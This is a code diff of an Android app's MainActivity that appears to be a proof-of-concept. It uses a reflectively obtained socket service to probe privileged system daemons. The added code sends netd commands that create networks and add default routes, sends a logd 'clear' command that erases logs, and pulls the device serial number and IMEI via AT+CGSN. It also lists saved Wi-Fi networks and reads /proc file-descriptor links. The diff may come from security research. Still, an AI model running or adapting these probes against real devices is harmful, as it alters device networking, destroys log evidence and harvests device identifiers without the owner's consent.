@@ -281,79 +281,178 @@ public class MainActivity extends AppCompatActivity {
 
     private ParcelFileDescriptor openSocket(String path, int[] handle) throws Exception {
         if (tzService == null) return null;
-        Class<?> cls = tzService.getClass();
-        Method m = cls.getMethod("a", String.class, int[].class);
-        return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
+        try {
+            Class<?> cls = tzService.getClass();
+            Method m = cls.getMethod("a", String.class, int[].class);
+            return (ParcelFileDescriptor) m.invoke(tzService, path, handle);
+        } catch (Exception e) {
+            appendLog("[!] openSocket exception: " + e.getMessage());
+            return null;
+        }
     }
 
     private void testNetd(FileDescriptor fd) throws Exception {
         appendLog("[NETD] Testing netd commands");
-        String[] cmds = {"help\n", "version\n", "interface list\n", "route list\n", "tether start 192.168.1.1 192.168.1.10\n", "dns resolver getservers\n"};
+        String[] cmds = {
+                "help\n", "version\n", "interface list\n", "route list\n",
+                "tether start 192.168.1.1 192.168.1.10\n",
+                "dns resolver getservers\n",
+                "dns resolver flushnet 0\n",
+                "network create 101\n",
+                "network interface add 101 wlan0\n",
+                "network route add 101 wlan0 0.0.0.0/0 192.168.1.1\n"
+        };
         for (String cmd : cmds) {
             if (stopRequested.get()) break;
-            String resp = sendTextCommand(fd, cmd, 2000);
-            appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+            try {
+                String resp = sendTextCommand(fd, cmd, 2000);
+                appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+            } catch (Exception e) {
+                appendLog("[NETD] Error on cmd " + cmd.trim() + ": " + e.getMessage());
+            }
         }
     }
 
     private void testDnsProxy(FileDescriptor fd) throws Exception {
-        appendLog("[DNS] Sending DNS query for localhost");
-        byte[] query = buildDnsQuery("localhost", 1);
-        byte[] resp = sendBinary(fd, query, 512, 2000);
-        if (resp != null && resp.length > 0) {
-            int rcode = resp[3] & 0x0F;
-            appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
-        } else {
-            appendLog("[DNS] No response");
+        appendLog("[DNS] Sending DNS query for localhost (A)");
+        try {
+            byte[] query = buildDnsQuery("localhost", 1);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                int rcode = resp[3] & 0x0F;
+                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
+            } else {
+                appendLog("[DNS] No response");
+            }
+        } catch (Exception e) {
+            appendLog("[DNS] Error: " + e.getMessage());
+        }
+
+        appendLog("[DNS] Sending DNS query for localhost (PTR)");
+        try {
+            byte[] query = buildDnsQuery("1.0.0.127.in-addr.arpa", 12);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                int rcode = resp[3] & 0x0F;
+                appendLog("[DNS] PTR response len=" + resp.length + ", RCODE=" + rcode);
+            } else {
+                appendLog("[DNS] No PTR response");
+            }
+        } catch (Exception e) {
+            appendLog("[DNS] PTR error: " + e.getMessage());
         }
     }
 
     private void testFwmarkd(FileDescriptor fd) throws Exception {
-        appendLog("[FW] Sending SELECT_NETWORK");
-        ByteBuffer buf = ByteBuffer.allocate(16);
-        buf.order(ByteOrder.LITTLE_ENDIAN);
-        buf.putInt(6);
-        buf.putInt(android.os.Process.myUid());
-        buf.putInt(0);
-        buf.putInt(0);
-        byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
-        if (resp != null && resp.length == 4) {
-            int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
-            appendLog("[FW] SELECT_NETWORK result=" + result);
-        } else {
-            appendLog("[FW] No/invalid response");
+        appendLog("[FW] Sending SELECT_NETWORK (cmd=6)");
+        try {
+            ByteBuffer buf = ByteBuffer.allocate(16);
+            buf.order(ByteOrder.LITTLE_ENDIAN);
+            buf.putInt(6);
+            buf.putInt(android.os.Process.myUid());
+            buf.putInt(0);
+            buf.putInt(0);
+            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
+            if (resp != null && resp.length == 4) {
+                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+                appendLog("[FW] SELECT_NETWORK result=" + result);
+            } else {
+                appendLog("[FW] No/invalid response");
+            }
+        } catch (Exception e) {
+            appendLog("[FW] Error: " + e.getMessage());
+        }
+
+        appendLog("[FW] Trying GET_NETWORK (cmd=7)");
+        try {
+            ByteBuffer buf = ByteBuffer.allocate(12);
+            buf.order(ByteOrder.LITTLE_ENDIAN);
+            buf.putInt(7);
+            buf.putInt(android.os.Process.myUid());
+            buf.putInt(0);
+            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
+            if (resp != null && resp.length >= 4) {
+                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+                appendLog("[FW] GET_NETWORK result=" + result);
+            } else {
+                appendLog("[FW] No response for GET_NETWORK");
+            }
+        } catch (Exception e) {
+            appendLog("[FW] GET_NETWORK error: " + e.getMessage());
         }
     }
 
     private void testMdnsd(FileDescriptor fd) throws Exception {
-        appendLog("[MDNS] Sending mDNS query");
-        byte[] query = buildDnsQuery("localhost.local", 1);
-        byte[] resp = sendBinary(fd, query, 512, 2000);
-        if (resp != null && resp.length > 0) {
-            appendLog("[MDNS] Response len=" + resp.length);
-        } else {
-            appendLog("[MDNS] No response");
+        appendLog("[MDNS] Sending mDNS query for localhost.local (A)");
+        try {
+            byte[] query = buildDnsQuery("localhost.local", 1);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                appendLog("[MDNS] Response len=" + resp.length);
+            } else {
+                appendLog("[MDNS] No response");
+            }
+        } catch (Exception e) {
+            appendLog("[MDNS] Error: " + e.getMessage());
+        }
+
+        appendLog("[MDNS] Sending mDNS PTR query for _services._dns-sd._udp.local");
+        try {
+            byte[] query = buildDnsQuery("_services._dns-sd._udp.local", 12);
+            byte[] resp = sendBinary(fd, query, 512, 2000);
+            if (resp != null && resp.length > 0) {
+                appendLog("[MDNS] PTR response len=" + resp.length);
+            } else {
+                appendLog("[MDNS] No PTR response");
+            }
+        } catch (Exception e) {
+            appendLog("[MDNS] PTR error: " + e.getMessage());
         }
     }
 
     private void testLogd(FileDescriptor fd) throws Exception {
         appendLog("[LOGD] Reading logd (no command)");
-        InputStream is = new FileInputStream(fd);
-        byte[] buf = new byte[4096];
-        int read = readBytes(is, buf, 4096, 1000);
-        if (read > 0) {
-            String str = new String(buf, 0, read, StandardCharsets.UTF_8);
-            appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
-        } else {
-            appendLog("[LOGD] No data");
+        try {
+            InputStream is = new FileInputStream(fd);
+            byte[] buf = new byte[4096];
+            int read = readBytes(is, buf, 4096, 1000);
+            if (read > 0) {
+                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
+                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
+            } else {
+                appendLog("[LOGD] No data");
+            }
+            is.close();
+        } catch (Exception e) {
+            appendLog("[LOGD] Error: " + e.getMessage());
         }
-        is.close();
+
+        appendLog("[LOGD] Sending clear command (if accepted)");
+        try {
+            String resp = sendTextCommand(fd, "clear\n", 500);
+            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
+        } catch (Exception e) {
+            appendLog("[LOGD] clear error: " + e.getMessage());
+        }
     }
 
     private void testPropertyService(FileDescriptor fd) throws Exception {
-        appendLog("[PROP] Sending get command");
-        String resp = sendTextCommand(fd, "get ro.build.version.release\n", 1000);
-        appendLog("[PROP] get response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        appendLog("[PROP] Sending get commands");
+        String[] props = {
+                "ro.build.version.release", "ro.product.model", "ro.product.manufacturer",
+                "persist.sys.timezone", "persist.sys.language", "sys.retaildemo.enabled",
+                "ro.boot.hardware", "ro.boot.serialno"
+        };
+        for (String p : props) {
+            if (stopRequested.get()) break;
+            try {
+                String cmd = "get " + p + "\n";
+                String resp = sendTextCommand(fd, cmd, 500);
+                appendLog("[PROP] " + p + " => " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+            } catch (Exception e) {
+                appendLog("[PROP] Error getting " + p + ": " + e.getMessage());
+            }
+        }
     }
 
     private void tryPropertySet() {
@@ -381,32 +480,77 @@ public class MainActivity extends AppCompatActivity {
 
     private void testWpaCtrl(FileDescriptor fd) throws Exception {
         appendLog("[WPA] Sending STATUS");
-        String resp = sendTextCommand(fd, "STATUS\n", 1000);
-        appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        try {
+            String resp = sendTextCommand(fd, "STATUS\n", 1000);
+            appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[WPA] STATUS error: " + e.getMessage());
+        }
+
+        appendLog("[WPA] Sending LIST_NETWORKS");
+        try {
+            String resp = sendTextCommand(fd, "LIST_NETWORKS\n", 1000);
+            appendLog("[WPA] LIST_NETWORKS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[WPA] LIST_NETWORKS error: " + e.getMessage());
+        }
     }
 
     private void testRild(FileDescriptor fd) throws Exception {
         appendLog("[RILD] Sending AT+CGMI");
-        byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
-        byte[] resp = sendBinary(fd, at, 256, 1500);
-        if (resp != null) {
-            appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
-        } else {
-            appendLog("[RILD] No response");
+        try {
+            byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
+            byte[] resp = sendBinary(fd, at, 256, 1500);
+            if (resp != null) {
+                appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
+            } else {
+                appendLog("[RILD] No response");
+            }
+        } catch (Exception e) {
+            appendLog("[RILD] CGMI error: " + e.getMessage());
+        }
+
+        appendLog("[RILD] Sending AT+CGSN");
+        try {
+            byte[] at = "AT+CGSN\r\n".getBytes(StandardCharsets.UTF_8);
+            byte[] resp = sendBinary(fd, at, 256, 1500);
+            if (resp != null) {
+                appendLog("[RILD] CGSN response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
+            } else {
+                appendLog("[RILD] No CGSN response");
+            }
+        } catch (Exception e) {
+            appendLog("[RILD] CGSN error: " + e.getMessage());
         }
     }
 
     private void testVold(FileDescriptor fd) throws Exception {
         appendLog("[VOLD] Sending status");
-        String resp = sendTextCommand(fd, "status\n", 1000);
-        appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        try {
+            String resp = sendTextCommand(fd, "status\n", 1000);
+            appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[VOLD] status error: " + e.getMessage());
+        }
+
+        appendLog("[VOLD] Sending list");
+        try {
+            String resp = sendTextCommand(fd, "list\n", 1000);
+            appendLog("[VOLD] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+        } catch (Exception e) {
+            appendLog("[VOLD] list error: " + e.getMessage());
+        }
     }
 
     private void testGeneric(FileDescriptor fd, String[] cmds) throws Exception {
         for (String cmd : cmds) {
             if (stopRequested.get()) break;
-            String resp = sendTextCommand(fd, cmd, 1000);
-            appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+            try {
+                String resp = sendTextCommand(fd, cmd, 1000);
+                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
+            } catch (Exception e) {
+                appendLog("[GEN] Error on " + cmd.trim() + ": " + e.getMessage());
+            }
         }
     }
 
@@ -420,43 +564,61 @@ public class MainActivity extends AppCompatActivity {
         for (String fd : fds) {
             if (stopRequested.get()) break;
             String link = "/proc/self/fd/" + fd;
-            String target = nativeReadFile(link);
-            appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
+            try {
+                String target = nativeReadFile(link);
+                appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
+            } catch (Exception e) {
+                appendLog("[PROC] " + link + " error: " + e.getMessage());
+            }
         }
     }
 
     private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
-        OutputStream os = new FileOutputStream(fd);
-        os.write(cmd.getBytes(StandardCharsets.UTF_8));
-        os.flush();
-        os.close();
+        OutputStream os = null;
+        InputStream is = null;
+        try {
+            os = new FileOutputStream(fd);
+            os.write(cmd.getBytes(StandardCharsets.UTF_8));
+            os.flush();
+            os.close();
+            os = null;
 
-        InputStream is = new FileInputStream(fd);
-        byte[] buf = new byte[4096];
-        int read = readBytes(is, buf, 4096, timeoutMs);
-        is.close();
-        if (read > 0) {
-            return new String(buf, 0, read, StandardCharsets.UTF_8);
+            is = new FileInputStream(fd);
+            byte[] buf = new byte[4096];
+            int read = readBytes(is, buf, 4096, timeoutMs);
+            if (read > 0) {
+                return new String(buf, 0, read, StandardCharsets.UTF_8);
+            }
+            return null;
+        } finally {
+            if (os != null) try { os.close(); } catch (Exception ignored) {}
+            if (is != null) try { is.close(); } catch (Exception ignored) {}
         }
-        return null;
     }
 
     private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
-        OutputStream os = new FileOutputStream(fd);
-        os.write(data);
-        os.flush();
-        os.close();
+        OutputStream os = null;
+        InputStream is = null;
+        try {
+            os = new FileOutputStream(fd);
+            os.write(data);
+            os.flush();
+            os.close();
+            os = null;
 
-        InputStream is = new FileInputStream(fd);
-        byte[] buf = new byte[maxResp];
-        int read = readBytes(is, buf, maxResp, timeoutMs);
-        is.close();
-        if (read > 0) {
-            byte[] resp = new byte[read];
-            System.arraycopy(buf, 0, resp, 0, read);
-            return resp;
+            is = new FileInputStream(fd);
+            byte[] buf = new byte[maxResp];
+            int read = readBytes(is, buf, maxResp, timeoutMs);
+            if (read > 0) {
+                byte[] resp = new byte[read];
+                System.arraycopy(buf, 0, resp, 0, read);
+                return resp;
+            }
+            return null;
+        } finally {
+            if (os != null) try { os.close(); } catch (Exception ignored) {}
+            if (is != null) try { is.close(); } catch (Exception ignored) {}
         }
-        return null;
     }
 
     private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
@@ -525,9 +687,13 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            if (!dir.exists() && !dir.mkdirs()) {
-                appendLog("Cannot create Download dir");
-                return;
+            if (dir == null || !dir.exists()) {
+                if (dir != null && !dir.mkdirs()) {
+                    appendLog("Cannot create Download dir, using internal storage");
+                    dir = getFilesDir();
+                } else if (dir == null) {
+                    dir = getFilesDir();
+                }
             }
             File file = new File(dir, "tz_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
